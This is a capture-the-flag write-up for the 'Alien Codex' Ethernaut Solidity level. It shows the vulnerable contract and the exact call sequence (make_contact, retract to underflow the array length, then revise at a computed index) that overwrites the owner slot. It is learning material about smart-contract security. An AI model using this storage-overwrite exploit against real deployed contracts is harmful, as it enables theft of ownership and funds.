## 19. Alien Codex

Goal for this exercise is:

- Claim ownership


<br/>

Here is the contract code:
~~~
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
~~~

First call is `contract.make_contact()`
Then calling `contract.retract()`causes underflow in codex.length.
Which expands it to include all storage slots. Then with`revise(uint i, bytes32 _content)` all
storage slots are accessible, but tricky part is to find right index to call.

<br>

From solidity documentation: *Array data is located at keccak256(p) *
When p is a slot in storage, *this slot stores the number of elements in the array*

My trouble here was that I was calculating codex array start location with:
`web3.utils.keccak256("1")`
When correct way is:
`web3.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000001")`

Start location with incorrect way (`web3.utils.hexToNumberString(web3.utils.keccak256("1"))`) became:
`90743482286830539503240959006302832933333810038750515972785732718729991261126`. When
correct resulted to `80084422859880547211683076133703299733277748156566366325829078699459944778998`

Then we can calculate which `i` call causes overflow in codex index and allows us to modify `owner` in slot 0.
Max index is `2 ** 256 - 1` so with array start location we can calculate needed `i`.

`(2**256 -1) - (<start location>) = 35707666377435648211887908874984608119992236509074197713628505308453184860937`
Using one bigger `i`than this will allow access to storage slot 0.

<br>

Last needed call was:
`contract.revise("35707666377435648211887908874984608119992236509074197713628505308453184860938", web3.utils.leftPad(player, 64))`














